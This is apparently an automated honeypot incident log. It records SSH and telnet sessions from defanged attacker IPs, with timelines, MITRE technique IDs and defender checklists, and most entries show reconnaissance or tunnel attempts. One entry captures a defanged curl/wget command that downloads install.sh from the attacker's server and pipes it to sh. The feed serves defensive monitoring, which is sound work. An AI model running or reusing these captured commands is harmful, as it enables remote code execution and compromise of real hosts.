### 🔴 HIGH · IR-060d13aaa569

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]223` |
| **First Seen** | 2026-08-04 12:36 |
| **Last Seen** | 2026-08-04 12:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:36:47` | `cowrie.session.connect` |
| `2026-08-04 12:36:47` | `cowrie.client.version` |
| `2026-08-04 12:36:48` | `cowrie.client.kex` |
| `2026-08-04 12:36:48` | `cowrie.login.success` |
| `2026-08-04 12:36:48` | `cowrie.direct-tcpip.request` |
| `2026-08-04 12:36:48` | `cowrie.direct-tcpip.data` |
| `2026-08-04 12:36:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]223` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]223` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41c1cf8e007f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-04 12:36 |
| **Last Seen** | 2026-08-04 12:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:36:59` | `cowrie.session.connect` |
| `2026-08-04 12:36:59` | `cowrie.client.version` |
| `2026-08-04 12:36:59` | `cowrie.client.kex` |
| `2026-08-04 12:36:59` | `cowrie.login.success` |
| `2026-08-04 12:37:00` | `cowrie.session.params` |
| `2026-08-04 12:37:00` | `cowrie.command.input` |
| `2026-08-04 12:37:00` | `cowrie.log.closed` |
| `2026-08-04 12:37:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f97003119726

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]225` |
| **First Seen** | 2026-08-04 12:37 |
| **Last Seen** | 2026-08-04 12:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:37:23` | `cowrie.session.connect` |
| `2026-08-04 12:37:23` | `cowrie.client.version` |
| `2026-08-04 12:37:24` | `cowrie.client.kex` |
| `2026-08-04 12:37:24` | `cowrie.login.success` |
| `2026-08-04 12:37:24` | `cowrie.direct-tcpip.request` |
| `2026-08-04 12:37:24` | `cowrie.direct-tcpip.data` |
| `2026-08-04 12:37:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]225` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]225` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79b4bb2ea860

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 12:37 |
| **Last Seen** | 2026-08-04 12:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:37:52` | `cowrie.session.connect` |
| `2026-08-04 12:37:52` | `cowrie.client.version` |
| `2026-08-04 12:37:52` | `cowrie.client.kex` |
| `2026-08-04 12:37:54` | `cowrie.login.success` |
| `2026-08-04 12:37:55` | `cowrie.session.params` |
| `2026-08-04 12:37:55` | `cowrie.command.input` |
| `2026-08-04 12:37:55` | `cowrie.command.input` |
| `2026-08-04 12:37:55` | `cowrie.command.input` |
| `2026-08-04 12:37:55` | `cowrie.command.input` |
| `2026-08-04 12:37:55` | `cowrie.command.input` |
| `2026-08-04 12:37:55` | `cowrie.command.success` |
| `2026-08-04 12:37:55` | `cowrie.command.input` |
| `2026-08-04 12:37:55` | `cowrie.command.input` |
| `2026-08-04 12:37:55` | `cowrie.command.input` |
| `2026-08-04 12:37:55` | `cowrie.command.input` |
| `2026-08-04 12:37:56` | `cowrie.log.closed` |
| `2026-08-04 12:37:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49edb206764c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-04 12:38 |
| **Last Seen** | 2026-08-04 12:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:38:37` | `cowrie.session.connect` |
| `2026-08-04 12:38:37` | `cowrie.client.version` |
| `2026-08-04 12:38:37` | `cowrie.client.kex` |
| `2026-08-04 12:38:38` | `cowrie.login.success` |
| `2026-08-04 12:38:38` | `cowrie.session.params` |
| `2026-08-04 12:38:38` | `cowrie.command.input` |
| `2026-08-04 12:38:39` | `cowrie.log.closed` |
| `2026-08-04 12:38:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cc1372a68d9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 12:39 |
| **Last Seen** | 2026-08-04 12:39 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:39:30` | `cowrie.session.connect` |
| `2026-08-04 12:39:31` | `cowrie.client.version` |
| `2026-08-04 12:39:31` | `cowrie.client.kex` |
| `2026-08-04 12:39:33` | `cowrie.login.success` |
| `2026-08-04 12:39:35` | `cowrie.session.params` |
| `2026-08-04 12:39:35` | `cowrie.command.input` |
| `2026-08-04 12:39:35` | `cowrie.command.input` |
| `2026-08-04 12:39:35` | `cowrie.command.input` |
| `2026-08-04 12:39:35` | `cowrie.command.input` |
| `2026-08-04 12:39:35` | `cowrie.command.input` |
| `2026-08-04 12:39:35` | `cowrie.command.success` |
| `2026-08-04 12:39:35` | `cowrie.command.input` |
| `2026-08-04 12:39:35` | `cowrie.command.input` |
| `2026-08-04 12:39:35` | `cowrie.command.input` |
| `2026-08-04 12:39:35` | `cowrie.command.input` |
| `2026-08-04 12:39:35` | `cowrie.log.closed` |
| `2026-08-04 12:39:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6be01a9edd8

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-04 12:40 |
| **Last Seen** | 2026-08-04 12:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:40:12` | `cowrie.session.connect` |
| `2026-08-04 12:40:12` | `cowrie.client.version` |
| `2026-08-04 12:40:12` | `cowrie.client.kex` |
| `2026-08-04 12:40:13` | `cowrie.login.success` |
| `2026-08-04 12:40:13` | `cowrie.session.params` |
| `2026-08-04 12:40:13` | `cowrie.command.input` |
| `2026-08-04 12:40:13` | `cowrie.log.closed` |
| `2026-08-04 12:40:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-292b6cf62213

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]192` |
| **First Seen** | 2026-08-04 12:40 |
| **Last Seen** | 2026-08-04 12:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:40:23` | `cowrie.session.connect` |
| `2026-08-04 12:40:23` | `cowrie.client.version` |
| `2026-08-04 12:40:24` | `cowrie.client.kex` |
| `2026-08-04 12:40:24` | `cowrie.login.success` |
| `2026-08-04 12:40:24` | `cowrie.direct-tcpip.request` |
| `2026-08-04 12:40:24` | `cowrie.direct-tcpip.data` |
| `2026-08-04 12:40:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]192` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]192` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34414cd592b4

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]226` |
| **First Seen** | 2026-08-04 12:40 |
| **Last Seen** | 2026-08-04 12:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:40:50` | `cowrie.session.connect` |
| `2026-08-04 12:40:50` | `cowrie.client.version` |
| `2026-08-04 12:40:50` | `cowrie.client.kex` |
| `2026-08-04 12:40:50` | `cowrie.login.success` |
| `2026-08-04 12:40:50` | `cowrie.direct-tcpip.request` |
| `2026-08-04 12:40:50` | `cowrie.direct-tcpip.data` |
| `2026-08-04 12:40:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]226` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]226` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d77ff3430154

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]231` |
| **First Seen** | 2026-08-04 12:41 |
| **Last Seen** | 2026-08-04 12:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, curl -s hxxp://94.154.43[.]231:3001/install.sh | sh, busybox wget -qO- hxxp://94.154.43[.]231:3001/install.sh | sh, wget -qO- hxxp://94.154.43[.]231:3001/install.sh | sh, /usr/bin/wget -qO- hxxp://94.154.43[.]231:3001/install.sh | sh` |
| **Download Attempts** | hxxp://94.154.43[.]231:3001/install.sh, hxxp://94.154.43[.]231:3001/install.sh, hxxp://94.154.43[.]231:3001/install.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:41:46` | `cowrie.session.connect` |
| `2026-08-04 12:41:46` | `cowrie.telnet.option` |
| `2026-08-04 12:41:46` | `cowrie.login.success` |
| `2026-08-04 12:41:47` | `cowrie.session.params` |
| `2026-08-04 12:41:47` | `cowrie.command.input` |
| `2026-08-04 12:41:47` | `cowrie.command.input` |
| `2026-08-04 12:41:47` | `cowrie.session.file_download.failed` |
| `2026-08-04 12:41:48` | `cowrie.command.input` |
| `2026-08-04 12:41:48` | `cowrie.command.success` |
| `2026-08-04 12:41:48` | `cowrie.session.file_download` |
| `2026-08-04 12:41:49` | `cowrie.command.input` |
| `2026-08-04 12:41:49` | `cowrie.session.file_download` |
| `2026-08-04 12:41:50` | `cowrie.command.input` |
| `2026-08-04 12:41:50` | `cowrie.session.file_download` |
| `2026-08-04 12:41:51` | `cowrie.command.input` |
| `2026-08-04 12:41:51` | `cowrie.session.file_download.failed` |
| `2026-08-04 12:41:52` | `cowrie.command.input` |
| `2026-08-04 12:41:52` | `cowrie.command.success` |
| `2026-08-04 12:41:52` | `cowrie.session.file_download.failed` |
| `2026-08-04 12:41:53` | `cowrie.command.input` |
| `2026-08-04 12:41:53` | `cowrie.command.input` |
| `2026-08-04 12:41:53` | `cowrie.command.failed` |
| `2026-08-04 12:41:54` | `cowrie.command.input` |
| `2026-08-04 12:41:54` | `cowrie.log.closed` |
| `2026-08-04 12:41:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]231` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]231` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-042ad4bcb000

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-04 12:41 |
| **Last Seen** | 2026-08-04 12:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:41:50` | `cowrie.session.connect` |
| `2026-08-04 12:41:50` | `cowrie.client.version` |
| `2026-08-04 12:41:50` | `cowrie.client.kex` |
| `2026-08-04 12:41:50` | `cowrie.login.success` |
| `2026-08-04 12:41:51` | `cowrie.session.params` |
| `2026-08-04 12:41:51` | `cowrie.command.input` |
| `2026-08-04 12:41:51` | `cowrie.log.closed` |
| `2026-08-04 12:41:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32feafb15a2f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 12:42 |
| **Last Seen** | 2026-08-04 12:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:42:54` | `cowrie.session.connect` |
| `2026-08-04 12:42:54` | `cowrie.client.version` |
| `2026-08-04 12:42:54` | `cowrie.client.kex` |
| `2026-08-04 12:42:56` | `cowrie.login.success` |
| `2026-08-04 12:42:58` | `cowrie.session.params` |
| `2026-08-04 12:42:58` | `cowrie.command.input` |
| `2026-08-04 12:42:58` | `cowrie.command.input` |
| `2026-08-04 12:42:58` | `cowrie.command.input` |
| `2026-08-04 12:42:58` | `cowrie.command.input` |
| `2026-08-04 12:42:58` | `cowrie.command.input` |
| `2026-08-04 12:42:58` | `cowrie.command.success` |
| `2026-08-04 12:42:58` | `cowrie.command.input` |
| `2026-08-04 12:42:58` | `cowrie.command.input` |
| `2026-08-04 12:42:58` | `cowrie.command.input` |
| `2026-08-04 12:42:58` | `cowrie.command.input` |
| `2026-08-04 12:42:59` | `cowrie.log.closed` |
| `2026-08-04 12:42:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19ce8e45b075

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-04 12:43 |
| **Last Seen** | 2026-08-04 12:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:43:29` | `cowrie.session.connect` |
| `2026-08-04 12:43:29` | `cowrie.client.version` |
| `2026-08-04 12:43:29` | `cowrie.client.kex` |
| `2026-08-04 12:43:29` | `cowrie.login.success` |
| `2026-08-04 12:43:30` | `cowrie.session.params` |
| `2026-08-04 12:43:30` | `cowrie.command.input` |
| `2026-08-04 12:43:30` | `cowrie.log.closed` |
| `2026-08-04 12:43:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6341a040af9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 12:44 |
| **Last Seen** | 2026-08-04 12:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:44:37` | `cowrie.session.connect` |
| `2026-08-04 12:44:38` | `cowrie.client.version` |
| `2026-08-04 12:44:38` | `cowrie.client.kex` |
| `2026-08-04 12:44:39` | `cowrie.login.success` |
| `2026-08-04 12:44:41` | `cowrie.session.params` |
| `2026-08-04 12:44:41` | `cowrie.command.input` |
| `2026-08-04 12:44:41` | `cowrie.command.input` |
| `2026-08-04 12:44:41` | `cowrie.command.input` |
| `2026-08-04 12:44:41` | `cowrie.command.input` |
| `2026-08-04 12:44:41` | `cowrie.command.input` |
| `2026-08-04 12:44:41` | `cowrie.command.success` |
| `2026-08-04 12:44:41` | `cowrie.command.input` |
| `2026-08-04 12:44:41` | `cowrie.command.input` |
| `2026-08-04 12:44:41` | `cowrie.command.input` |
| `2026-08-04 12:44:41` | `cowrie.command.input` |
| `2026-08-04 12:44:41` | `cowrie.log.closed` |
| `2026-08-04 12:44:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b95d989bc58d

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-04 12:45 |
| **Last Seen** | 2026-08-04 12:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:45:04` | `cowrie.session.connect` |
| `2026-08-04 12:45:04` | `cowrie.client.version` |
| `2026-08-04 12:45:04` | `cowrie.client.kex` |
| `2026-08-04 12:45:05` | `cowrie.login.success` |
| `2026-08-04 12:45:06` | `cowrie.session.params` |
| `2026-08-04 12:45:06` | `cowrie.command.input` |
| `2026-08-04 12:45:06` | `cowrie.log.closed` |
| `2026-08-04 12:45:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6dd38693e07

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]192` |
| **First Seen** | 2026-08-04 12:46 |
| **Last Seen** | 2026-08-04 12:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:46:12` | `cowrie.session.connect` |
| `2026-08-04 12:46:12` | `cowrie.client.version` |
| `2026-08-04 12:46:12` | `cowrie.client.kex` |
| `2026-08-04 12:46:13` | `cowrie.login.success` |
| `2026-08-04 12:46:13` | `cowrie.direct-tcpip.request` |
| `2026-08-04 12:46:13` | `cowrie.direct-tcpip.data` |
| `2026-08-04 12:46:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]192` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]192` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-622582f134f3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 12:46 |
| **Last Seen** | 2026-08-04 12:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:46:22` | `cowrie.session.connect` |
| `2026-08-04 12:46:22` | `cowrie.client.version` |
| `2026-08-04 12:46:22` | `cowrie.client.kex` |
| `2026-08-04 12:46:24` | `cowrie.login.success` |
| `2026-08-04 12:46:26` | `cowrie.session.params` |
| `2026-08-04 12:46:26` | `cowrie.command.input` |
| `2026-08-04 12:46:26` | `cowrie.command.input` |
| `2026-08-04 12:46:26` | `cowrie.command.input` |
| `2026-08-04 12:46:26` | `cowrie.command.input` |
| `2026-08-04 12:46:26` | `cowrie.command.input` |
| `2026-08-04 12:46:26` | `cowrie.command.success` |
| `2026-08-04 12:46:26` | `cowrie.command.input` |
| `2026-08-04 12:46:26` | `cowrie.command.input` |
| `2026-08-04 12:46:26` | `cowrie.command.input` |
| `2026-08-04 12:46:26` | `cowrie.command.input` |
| `2026-08-04 12:46:26` | `cowrie.log.closed` |
| `2026-08-04 12:46:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd7d6a5adbd0

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-04 12:46 |
| **Last Seen** | 2026-08-04 12:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 12:46:38` | `cowrie.session.connect` |
| `2026-08-04 12:46:38` | `cowrie.client.version` |
| `2026-08-04 12:46:38` | `cowrie.client.kex` |
| `2026-08-04 12:46:38` | `cowrie.login.success` |
| `2026-08-04 12:46:39` | `cowrie.session.params` |
| `2026-08-04 12:46:39` | `cowrie.command.input` |
| `2026-08-04 12:46:39` | `cowrie.log.closed` |
| `2026-08-04 12:46:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-634507b240f6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 12:48 |
| **Last Seen** | 2026-08-04 12:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
